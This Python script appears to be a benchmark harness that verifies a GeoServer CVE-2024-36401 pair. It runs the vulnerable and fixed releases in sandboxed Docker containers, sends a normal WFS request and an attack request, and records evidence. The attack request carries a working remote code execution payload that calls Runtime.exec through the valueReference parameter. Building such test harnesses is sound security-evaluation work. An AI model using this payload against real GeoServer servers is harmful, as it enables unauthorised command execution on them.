from __future__ import annotations

import argparse
import hashlib
import json
import os
import socket
import subprocess
import time
from pathlib import Path
from uuid import uuid4

import httpx


APP_ROOT = Path(__file__).resolve().parents[1]
PAIR_PATH = APP_ROOT / "configs" / "stage3a-cve-geoserver-2024-36401-v1.json"
RELAY_CONFIG_PATH = APP_ROOT / "configs" / "stage3a-cve-http-relay-v1.json"
_PROJECT_PORTS: dict[str, int] = {}


def free_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("127.0.0.1", 0))
        return int(listener.getsockname()[1])
COMPOSE_PATH = APP_ROOT / "cve-geoserver" / "compose.yaml"
EVENT_SCHEMA_PATH = APP_ROOT.parent / "contracts" / "verifier-ledger-event.schema.json"
CONTROL_ORIGIN = "http://127.0.0.1:18081"
RESET_HEADERS = {"X-Ruby-Reset-Token": "development-reset-only"}


def canonical_json(value: object) -> str:
    return json.dumps(value, ensure_ascii=False, sort_keys=True, separators=(",", ":"))


def digest_bytes(value: bytes) -> str:
    return "sha256:" + hashlib.sha256(value).hexdigest()


def digest(value: object) -> str:
    return digest_bytes(canonical_json(value).encode("utf-8"))


def run(
    arguments: list[str],
    *,
    environment: dict[str, str] | None = None,
    check: bool = True,
    timeout: int = 180,
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        arguments,
        cwd=APP_ROOT,
        env=environment,
        check=check,
        timeout=timeout,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )


def main_compose(*arguments: str) -> subprocess.CompletedProcess[str]:
    return run(["docker", "compose", *arguments])


def cve_compose(
    project: str,
    image: str,
    *arguments: str,
    check: bool = True,
) -> subprocess.CompletedProcess[str]:
    environment = os.environ.copy()
    environment["RUBY_GEOSERVER_TARGET_IMAGE"] = image
    relay = json.loads(RELAY_CONFIG_PATH.read_text(encoding="utf-8"))
    environment["RUBY_CVE_RELAY_IMAGE"] = f"nginx@{relay['image_digest']}"
    environment["RUBY_GEOSERVER_TARGET_PORT"] = str(
        _PROJECT_PORTS.setdefault(project, free_local_port())
    )
    return run(
        ["docker", "compose", "-p", project, "-f", str(COMPOSE_PATH), *arguments],
        environment=environment,
        check=check,
        timeout=240,
    )


def require_main_stack() -> None:
    httpx.get(f"{CONTROL_ORIGIN}/health/live", timeout=5).raise_for_status()
    for service in ("api", "evaluator"):
        if not main_compose("ps", "-q", service).stdout.strip():
            raise RuntimeError(f"main Compose service is not running: {service}")


def reset_main_stack() -> None:
    httpx.post(
        f"{CONTROL_ORIGIN}/internal/reset", headers=RESET_HEADERS, timeout=20
    ).raise_for_status()


def main_service_image_digest(service: str) -> str:
    container_id = main_compose("ps", "-q", service).stdout.strip()
    return run(["docker", "inspect", container_id, "--format", "{{.Image}}"]).stdout.strip()


def main_compose_exec(service: str, code: str, *arguments: str) -> str:
    return main_compose(
        "exec", "-T", service, "python", "-c", code, *arguments
    ).stdout.strip()


def record_effect(
    trial_id: str,
    protected_key: str,
    *,
    event_type: str = "command.executed",
    deduplication_key: str = "geoserver-command-marker",
) -> None:
    code = (
        "import sys;"
        "from ruby_web.config import Settings;"
        "from ruby_web.database import Database;"
        "from ruby_web.events import record_internal_event;"
        "d=Database(Settings.from_environment().database_url);s=d.sessions();"
        "record_internal_event(s,trial_id=sys.argv[1],event_type=sys.argv[3],"
        "subject={'authorized':'false'},object_={'resource_id':sys.argv[2]},"
        "protected_resource_key=sys.argv[2],deduplication_key=sys.argv[4]);"
        "s.commit();s.close()"
    )
    main_compose_exec(
        "api", code, trial_id, protected_key, event_type, deduplication_key
    )


def evaluator_manifest(
    protected_key: str,
    *,
    scenario_id: str = "geoserver-cve-2024-36401",
    predicate_id: str = "geoserver.cve-2024-36401.command-marker",
    effect_type: str = "controlled-command-execution",
    event_type: str = "command.executed",
    deduplication_key: str = "geoserver-command-marker",
) -> tuple[str, dict[str, object]]:
    subject = {"authorized": "false"}
    object_ = {"resource_id": protected_key}
    condition = {
        "deduplication_key": deduplication_key,
        "event_type": event_type,
        "minimum_occurrences": 1,
        "object": object_,
        "protected_resource_key": protected_key,
        "subject": subject,
        "window_seconds": 300,
    }
    manifest = {
        "contract_version": 1,
        "scenario_id": scenario_id,
        "verifier_image_digest": main_service_image_digest("evaluator"),
        "event_schema_digest": digest_bytes(EVENT_SCHEMA_PATH.read_bytes()),
        "network_access": "control-only",
        "attacker_visible": False,
        "predicates": [
            {
                "predicate_id": predicate_id,
                "effect_type": effect_type,
                "event_type": event_type,
                "subject_selector": canonical_json(subject),
                "object_selector": canonical_json(object_),
                "protected_resource_key": protected_key,
                "condition_digest": digest(condition),
                "window_seconds": 300,
                "minimum_occurrences": 1,
                "deduplication_key": deduplication_key,
            }
        ],
    }
    return predicate_id, manifest


def evaluate(
    trial_id: str,
    protected_key: str,
    **manifest_options: str,
) -> tuple[dict[str, object], dict[str, object]]:
    predicate_id, manifest = evaluator_manifest(protected_key, **manifest_options)
    payload = canonical_json(
        {"trial_id": trial_id, "predicate_id": predicate_id, "verifier": manifest}
    )
    code = (
        "import os,sys,urllib.request;"
        "r=urllib.request.Request('http://127.0.0.1:8000/internal/evaluate',"
        "data=sys.argv[1].encode(),headers={'Content-Type':'application/json',"
        "'X-Ruby-Evaluator-Token':os.environ['RUBY_EVALUATOR_TOKEN']});"
        "print(urllib.request.urlopen(r).read().decode())"
    )
    return json.loads(main_compose_exec("evaluator", code, payload)), manifest


def wait_ready(container_id: str) -> int:
    started = time.monotonic()
    deadline = started + 120
    while time.monotonic() < deadline:
        status = run(
            ["docker", "inspect", container_id, "--format", "{{.State.Status}}"]
        ).stdout.strip()
        if status != "running":
            raise RuntimeError(f"GeoServer stopped before readiness: {status}")
        try:
            probe = run(
                [
                    "docker",
                    "exec",
                    container_id,
                    "curl",
                    "-fsS",
                    "--connect-timeout",
                    "2",
                    "--max-time",
                    "3",
                    "http://127.0.0.1:8080/geoserver/web/",
                ],
                check=False,
                timeout=5,
            )
        except subprocess.TimeoutExpired:
            time.sleep(2)
            continue
        if probe.returncode == 0:
            return round((time.monotonic() - started) * 1000)
        time.sleep(2)
    raise RuntimeError("GeoServer did not become ready within 120 seconds")


def client_request(
    *,
    client_image: str,
    network: str,
    attack: bool,
) -> subprocess.CompletedProcess[str]:
    script = """import sys
import urllib.error
import urllib.parse
import urllib.request

base = "http://target:8080/geoserver/wfs"
parameters = {"service": "WFS", "version": "2.0.0"}
if sys.argv[1] == "attack":
    parameters.update(
        {
            "request": "GetPropertyValue",
            "typeNames": "topp:states",
            "valueReference": "exec(java.lang.Runtime.getRuntime(),'touch /tmp/ruby-cve-2024-36401-success')",
        }
    )
else:
    parameters.update(
        {"request": "GetFeature", "typeNames": "topp:states", "count": "1"}
    )
try:
    response = urllib.request.urlopen(
        base + "?" + urllib.parse.urlencode(parameters), timeout=30
    )
except urllib.error.HTTPError as error:
    response = error
body = response.read()
print(str(response.status) + " " + str(len(body)))
"""
    return run(
        [
            "docker",
            "run",
            "--rm",
            "--network",
            network,
            "--read-only",
            "--tmpfs",
            "/tmp:rw,noexec,nosuid,size=16m",
            "--memory",
            "128m",
            "--cpus",
            "0.5",
            "--pids-limit",
            "64",
            "--cap-drop",
            "ALL",
            "--security-opt",
            "no-new-privileges:true",
            client_image,
            "python",
            "-c",
            script,
            "attack" if attack else "normal",
        ],
        check=False,
        timeout=60,
    )


def image_evidence(reference: str, expected_digest: str) -> dict[str, object]:
    inspected = json.loads(run(["docker", "image", "inspect", reference]).stdout)[0]
    return {
        "reference": reference,
        "image_id": inspected["Id"],
        "repo_digests": inspected.get("RepoDigests", []),
        "architecture": inspected["Architecture"],
        "os": inspected["Os"],
        "size_bytes": inspected["Size"],
        "digest_matches": any(
            value.endswith("@" + expected_digest)
            for value in inspected.get("RepoDigests", [])
        ),
        "linux_amd64": inspected["Os"] == "linux"
        and inspected["Architecture"] == "amd64",
    }


def remaining_resources(project: str) -> dict[str, list[str]]:
    containers = run(
        [
            "docker",
            "ps",
            "-a",
            "--filter",
            f"label=com.docker.compose.project={project}",
            "--format",
            "{{.ID}}",
        ]
    ).stdout.splitlines()
    networks = run(
        [
            "docker",
            "network",
            "ls",
            "--filter",
            f"label=com.docker.compose.project={project}",
            "--format",
            "{{.ID}}",
        ]
    ).stdout.splitlines()
    return {"containers": containers, "networks": networks}


def run_condition(
    *,
    name: str,
    release: dict[str, object],
    pair: dict[str, object],
    run_id: str,
) -> dict[str, object]:
    project = f"ruby-geoserver-{name}-{uuid4().hex[:10]}"
    target_image = f"docker.osgeo.org/geoserver@{release['image_digest']}"
    client = pair["client"]
    client_image = f"python@{client['image_digest']}"
    marker_path = str(pair["reference_attack"]["marker_path"])
    protected_key = str(pair["reference_attack"]["protected_resource_key"])
    trial_id = uuid4().hex
    reset_main_stack()
    started = time.monotonic()
    logs = ""
    try:
        cve_compose(
            project, target_image, "up", "-d", "--no-build", "target", "relay"
        )
        container_id = cve_compose(project, target_image, "ps", "-q", "target").stdout.strip()
        if not container_id:
            raise RuntimeError("GeoServer target container was not created")
        ready_ms = wait_ready(container_id)
        network = f"{project}_target"
        normal = client_request(client_image=client_image, network=network, attack=False)
        run(["docker", "exec", container_id, "rm", "-f", marker_path])
        attack = client_request(client_image=client_image, network=network, attack=True)
        marker = run(
            ["docker", "exec", container_id, "test", "-f", marker_path], check=False
        ).returncode == 0
        if marker:
            record_effect(trial_id, protected_key)
        evaluator, verifier = evaluate(trial_id, protected_key)
        stats = json.loads(
            run(
                ["docker", "stats", "--no-stream", "--format", "{{json .}}", container_id]
            ).stdout
        )
        image = image_evidence(target_image, str(release["image_digest"]))
        event_count = len(evaluator["matched_event_ids"])
        expected_marker = name == "vulnerable"
        checks = {
            "sealed_image_digest": image["digest_matches"],
            "linux_amd64_runtime": image["linux_amd64"],
            "normal_wfs_request_succeeded": normal.returncode == 0
            and normal.stdout.startswith("200 "),
            "attack_client_completed": attack.returncode == 0,
            "marker_matches_condition": marker is expected_marker,
            "evaluator_matches_condition": bool(evaluator["objective_achieved"])
            is expected_marker,
            "event_count_matches_condition": event_count == (1 if expected_marker else 0),
        }
        logs = cve_compose(
            project, target_image, "logs", "--no-color", "target", check=False
        ).stdout
        return {
            "condition": name,
            "version": release["version"],
            "trial_id": trial_id,
            "project": project,
            "ready_milliseconds": ready_ms,
            "normal_request": {
                "returncode": normal.returncode,
                "stdout": normal.stdout.strip(),
                "stderr_sha256": digest_bytes(normal.stderr.encode()),
            },
            "attack_request": {
                "returncode": attack.returncode,
                "stdout": attack.stdout.strip(),
                "stderr_sha256": digest_bytes(attack.stderr.encode()),
            },
            "marker_created": marker,
            "evaluator": evaluator,
            "verifier_digest": digest(verifier),
            "image": image,
            "runtime_stats": stats,
            "elapsed_milliseconds": round((time.monotonic() - started) * 1000),
            "checks": checks,
            "all_checks_passed": all(checks.values()),
            "target_log_sha256": digest_bytes(logs.encode()),
        }
    finally:
        cve_compose(
            project,
            target_image,
            "down",
            "--volumes",
            "--remove-orphans",
            check=False,
        )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Check the sealed GeoServer CVE pair")
    parser.add_argument("--output-dir", type=Path, required=True)
    parser.add_argument("--run-id", required=True)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.output_dir.exists():
        raise FileExistsError(f"refusing to overwrite output: {args.output_dir}")
    require_main_stack()
    pair = json.loads(PAIR_PATH.read_text(encoding="utf-8"))
    args.output_dir.mkdir(parents=True, exist_ok=False)
    conditions: list[dict[str, object]] = []
    try:
        for name in ("vulnerable", "fixed"):
            conditions.append(
                run_condition(
                    name=name,
                    release=pair[name],
                    pair=pair,
                    run_id=args.run_id,
                )
            )
    except Exception as error:
        failure_path = args.output_dir / "stage3a-geoserver-cve-pair-failure.json"
        failure_path.write_text(
            json.dumps(
                {
                    "schema_version": 1,
                    "run_id": args.run_id,
                    "pair_digest": digest_bytes(PAIR_PATH.read_bytes()),
                    "completed_conditions": conditions,
                    "failure_type": type(error).__name__,
                    "failure_reason": str(error),
                },
                ensure_ascii=False,
                indent=2,
                sort_keys=True,
            )
            + "\n",
            encoding="utf-8",
        )
        print(
            canonical_json(
                {
                    "failure_report": str(failure_path),
                    "failure_report_sha256": digest_bytes(failure_path.read_bytes()),
                    "status": "failed",
                }
            )
        )
        return 2
    residue = {
        condition["project"]: remaining_resources(str(condition["project"]))
        for condition in conditions
    }
    report = {
        "schema_version": 1,
        "run_id": args.run_id,
        "pair_digest": digest_bytes(PAIR_PATH.read_bytes()),
        "pair": pair,
        "conditions": conditions,
        "cleanup": residue,
        "all_checks_passed": all(
            condition["all_checks_passed"] for condition in conditions
        )
        and all(
            not resources["containers"] and not resources["networks"]
            for resources in residue.values()
        ),
    }
    report_path = args.output_dir / "stage3a-geoserver-cve-pair-report.json"
    report_path.write_text(
        json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    print(
        canonical_json(
            {
                "report": str(report_path),
                "report_sha256": digest_bytes(report_path.read_bytes()),
                "all_checks_passed": report["all_checks_passed"],
            }
        )
    )
    return 0 if report["all_checks_passed"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
